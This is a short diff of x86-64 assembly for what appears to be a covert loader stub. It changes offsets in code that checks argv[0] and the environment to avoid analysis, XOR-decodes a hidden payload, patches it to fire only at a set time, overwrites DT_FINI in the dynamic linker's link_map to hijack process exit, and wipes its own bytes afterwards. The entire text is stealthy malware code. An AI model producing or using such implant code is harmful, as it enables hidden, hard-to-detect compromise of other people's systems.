@@ -8,8 +8,8 @@
 
 _begin:
     push rbx
-    lea rbx, [rip+_begin-8]
-    mov rdi, [rbx-16] /* &_dl_argv */
+    lea rbx, [rip+_begin-24]
+    mov rdi, [rbx] /* &_dl_argv */
 
     // Make sure argv[0] starts with '/' (which is unusual when debugging, but plausible with xinetd)
     mov rax, [rdi]
@@ -45,9 +45,9 @@ env_check_loop:
 
 env_check_okay:
     // Decode payload
-    movqq rcx, (PAYLOAD_SIZE_IN_WORDS - 1)
-    // lea rdi, [rbx+(_end-_begin)+8+8] GNU AS outputs 488dba6d000000, why ._.
-    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8+8
+    movqq rcx, PAYLOAD_SIZE_IN_WORDS
+    // lea rdi, [rbx+(_end-_begin)+24-4] GNU AS outputs 488dba6d000000, why ._.
+    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+24-4
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
@@ -61,21 +61,20 @@ decode_loop:
     loop decode_loop
 
     // Patch payload to only run at correct time.
-    lea rdi, [rdi+PAYLOAD_TIME_IMM_OFFSET]
-    // call [rbx+(_end-_begin)+8], the same thing again ._.
-    .byte 0xff, 0x53, (_end-_begin)+8
+    lea rdi, [rdi+4+PAYLOAD_TIME_IMM_OFFSET]
+    call [rbx-8]
 
     // Overwrite dl_info[DT_FINI] in link_map
-    mov rdi, [rbx-8]
-    mov rax, [rbx]
+    mov rdi, [rbx+8]
+    mov rax, [rbx+16]
     stosq
 bye:
     // Zeroing self
     movqq rdi, rbx
     pop rbx
-    // GNU AS (2.40) is too stupid: it assembles "push _fin-_begin+24" into a 0x68 (4 byte push) instead of single byte one.
+    // GNU AS (2.40) is too stupid: it assembles "push (_fin-_begin+24)" into a 0x68 (4 byte push) instead of single byte one.
     .byte 0x6A
-    .byte _fin-_begin+8
+    .byte (_fin-_begin+24)
     pop rcx
     xor eax, eax
     rep stosb
